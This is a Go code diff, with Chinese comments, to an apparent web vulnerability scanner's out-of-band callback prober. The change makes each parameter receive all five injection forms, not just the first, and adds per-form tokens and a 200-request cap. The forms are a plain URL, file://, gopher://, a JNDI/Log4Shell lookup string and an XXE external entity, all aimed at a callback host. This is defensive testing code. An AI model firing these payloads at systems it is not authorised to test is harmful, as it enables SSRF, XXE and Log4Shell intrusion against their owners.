@@ -26,6 +26,7 @@ type oobProbe struct {
 	tgt   Target
 	token string
 	url   string
+	form  string // 出带形态标签（HTTP / file / gopher / JNDI / XXE）
 }
 
 // OobConfig 出带回调运行参数（引擎从 config.Oob 映射过来）。
@@ -38,45 +39,75 @@ type OobConfig struct {
 	MaxProbes int
 }
 
+// oobFormLabels 与 oobPayloads 一一对应的形态标签（证据里指认触发通道）。
+var oobFormLabels = []string{"HTTP", "file", "gopher", "JNDI", "XXE"}
+
+// oobHardMaxRequests 单次出带探测的请求硬上限：目标数 × 形态数可能放大
+// 5 倍请求，这里兜住上限，避免 opt-in 通道在大量参数目标上失控。
+const oobHardMaxRequests = 200
+
 // oobPayloads token 注入形态：裸 URL / 协议包装（SSRF 常见）/
-// JNDI 形态（Log4Shell）/ XML 实体（XXE）——一处命中即该类短路。
+// JNDI 形态（Log4Shell）/ XML 实体（XXE）。
+//
+// B-05：返回的是**全部**形态，调用方必须逐形态发送。此前调用方在第一个
+// 形态后无条件 break，导致 file/gopher/JNDI/XXE 四种形态在任何配置下都
+// 不会真正发出——XXE 与 Log4Shell 的出带通道属于结构性漏报。
 func oobPayloads(host, token string) []string {
 	base := strings.TrimRight(host, "/")
 	if !strings.Contains(base, "://") {
 		base = "http://" + base
 	}
+	hostOnly := strings.TrimPrefix(strings.TrimPrefix(base, "http://"), "https://")
 	return []string{
 		base + "/" + token,
 		"file://" + base + "/" + token,
-		"gopher://" + strings.TrimPrefix(strings.TrimPrefix(base, "http://"), "https://") + "/_" + token,
-		"${jndi:ldap://" + strings.TrimPrefix(strings.TrimPrefix(base, "http://"), "https://") + "/" + token + "}",
+		"gopher://" + hostOnly + "/_" + token,
+		"${jndi:ldap://" + hostOnly + "/" + token + "}",
 		"<!DOCTYPE r [<!ENTITY x SYSTEM \"" + base + "/" + token + "\">]>",
 	}
 }
 
-// oobProbeAll 出带探测主流程：逐参数注入 → 轮询/读日志确认 → 出 Finding。
+// oobProbeAll 出带探测主流程：逐参数逐形态注入 → 轮询/读日志确认 → 出 Finding。
+//
+// 预算口径：
+//   - MaxProbes 沿用「探测参数（目标）上限」语义，未配置 = 全部目标；
+//   - 每目标每种形态各发一次，总请求 ≤ min(目标数×形态数, oobHardMaxRequests)；
+//   - 每个（目标, 形态）用**独立随机令牌**，接收端留下哪个令牌就能指认是
+//     哪条出带通道被触发（SSRF / XXE / JNDI …），而不是笼统一条"有外发"。
 func (r *Runner) oobProbeAll(targets []Target, cfg OobConfig) []Finding {
 	if !cfg.Enabled || cfg.TokenHost == "" || r.stopped() {
 		return nil
 	}
-	cap := cfg.MaxProbes
-	if cap <= 0 || cap > len(targets) {
-		cap = len(targets)
+	maxTargets := cfg.MaxProbes
+	if maxTargets <= 0 || maxTargets > len(targets) {
+		maxTargets = len(targets)
+	}
+	budget := maxTargets * len(oobFormLabels)
+	if budget > oobHardMaxRequests {
+		budget = oobHardMaxRequests
 	}
 	var probes []oobProbe
-	for i := 0; i < cap && !r.stopped(); i++ {
+	sent := 0
+	for i := 0; i < maxTargets && sent < budget && !r.stopped(); i++ {
 		tgt := targets[i]
-		token := "sl" + randToken()[:16]
-		payloads := oobPayloads(cfg.TokenHost, token)
-		// 单参数只发第一形态（URL 形态覆盖面最广），长度超限时退到下一个形态。
-		for _, pl := range payloads {
-			u := setParam(tgt.URL, tgt.Param, pl)
+		for fi := range oobFormLabels {
+			if sent >= budget || r.stopped() {
+				break
+			}
+			token := "sl" + randToken()[:16]
+			payloads := oobPayloads(cfg.TokenHost, token)
+			if fi >= len(payloads) {
+				break
+			}
+			u := setParam(tgt.URL, tgt.Param, payloads[fi])
 			if len(u) > r.opts.MaxURLLen {
-				continue
+				continue // 该形态超长：跳过，继续下一形态（不是整目标放弃）
 			}
 			r.fetch.GetSmall(u)
-			probes = append(probes, oobProbe{tgt: tgt, token: token, url: u})
-			break
+			probes = append(probes, oobProbe{
+				tgt: tgt, token: token, url: u, form: oobFormLabels[fi],
+			})
+			sent++
 		}
 	}
 	if len(probes) == 0 {
@@ -90,12 +121,12 @@ func (r *Runner) oobProbeAll(targets []Target, cfg OobConfig) []Finding {
 			continue
 		}
 		f := Finding{
-			Check: "oob-callback", Title: "出带回调确认（SSRF/盲 XSS/XXE 外发）",
+			Check: "oob-callback", Title: "出带回调确认（" + p.form + " 通道外发）",
 			Severity: "high", URL: p.tgt.URL, Param: p.tgt.Param, Payload: p.url,
-			Evidence: "参数 " + p.tgt.Param + " 注入出带地址后，接收端记录到回连令牌 " + p.token,
+			Evidence: "参数 " + p.tgt.Param + " 注入 " + p.form + " 形态出带地址后，接收端记录到回连令牌 " + p.token,
 			Advice:   "对该参数的外发目标做白名单校验；禁止用户输入决定请求地址",
 		}
-		f.Signals = []string{"接收端记录到唯一令牌 " + p.token, "确认目标外发请求"}
+		f.Signals = []string{"接收端记录到唯一令牌 " + p.token, "确认目标外发请求（" + p.form + "）"}
 		out = append(out, f)
 	}
 	return out
